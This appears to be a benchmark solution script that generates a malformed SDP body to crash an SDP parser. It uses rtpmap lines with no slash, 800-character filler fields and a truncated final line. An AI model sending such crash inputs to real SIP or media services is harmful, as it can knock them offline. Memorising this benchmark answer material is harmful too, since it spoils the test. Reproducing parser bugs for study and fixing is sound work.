import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        base_lines = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=Test SDP fuzz",
            "c=IN IP4 127.0.0.1",
            "t=0 0",
            "m=audio 9 RTPAVP 0 96",
            "a=sendrecv",
        ]

        long_A = "A" * 800
        digit_block = "1" * 800

        blocks = []
        for i in range(3):
            pt = 96 + i
            blocks.append(f"a=rtpmap:{pt} PCMUNOSLASH8000{long_A}")
            blocks.append(f"a=fmtp:{pt} x={digit_block}")

        truncated_line_end = "a=rtpmap:0 " + ("B" * 800)

        body = "\r\n".join(base_lines + blocks) + "\r\n" + truncated_line_end
        return body.encode("ascii")
